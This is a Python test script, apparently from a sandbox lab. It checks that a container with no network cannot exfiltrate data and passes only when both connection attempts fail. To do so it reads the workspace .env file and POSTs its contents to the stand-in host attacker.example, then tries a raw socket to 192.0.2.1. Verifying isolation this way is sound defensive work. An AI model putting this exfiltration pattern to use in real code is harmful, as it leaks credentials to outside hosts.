"""Exfil attempt that must fail because the container has no network.

The result file records the error class only. Span export happens in a
different, networked process because this container cannot reach the collector.
"""

from __future__ import annotations

import json
import os
import sys
import urllib.request
from pathlib import Path

from lab.markers import all_markers
from lab.tools import read_file
from lab.workspace import Workspace


def _classify(exc: BaseException) -> str:
    text = str(exc).lower()
    if "network is unreachable" in text or "network unreachable" in text:
        return "network_unreachable"
    if "name or service not known" in text or "temporary failure in name" in text or "name resolution" in text:
        return "name_resolution"
    if "timed out" in text:
        return "timeout"
    return "transport"


def _detail(exc: BaseException) -> str:
    text = f"{type(exc).__name__}: {exc}"
    for marker in all_markers():
        text = text.replace(marker, "[redacted]")
    return text[:240]


def _try_hostname(payload: bytes) -> dict:
    try:
        request = urllib.request.Request(
            "http://attacker.example/collect",
            data=payload,
            method="POST",
        )
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        with opener.open(request, timeout=3) as response:
            return {"error_kind": "unexpected_success", "http_status": int(response.status)}
    except Exception as exc:  # noqa: BLE001 - the network failure is the result
        return {"error_kind": _classify(exc), "detail": _detail(exc)}


def _try_literal_ip() -> dict:
    """A second attempt with no DNS, so the result shows the kernel error too."""
    sock = __import__("socket").socket()
    sock.settimeout(2)
    try:
        sock.connect(("192.0.2.1", 80))
    except Exception as exc:  # noqa: BLE001
        return {"error_kind": _classify(exc), "detail": _detail(exc)}
    finally:
        sock.close()
    return {"error_kind": "unexpected_success", "detail": "connected to 192.0.2.1:80"}


def main() -> int:
    workspace = Workspace(os.environ.get("WORKSPACE", "/workspace"))
    destination = os.environ.get("RESULT_PATH", "/out/result.json")
    payload = read_file(workspace, ".env")
    hostname = _try_hostname(payload)
    literal = _try_literal_ip()
    # The hostname attempt is the planted exfil. The literal IP records whether
    # the network namespace itself has a route.
    result = {
        "error_kind": hostname["error_kind"],
        "detail": hostname.get("detail", ""),
        "literal_ip": literal,
    }
    Path(destination).write_text(json.dumps(result), encoding="utf-8")
    print(json.dumps(result), flush=True)
    if hostname["error_kind"] in {"network_unreachable", "name_resolution"} and literal["error_kind"] in {
        "network_unreachable",
        "name_resolution",
        "timeout",
        "transport",
    }:
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
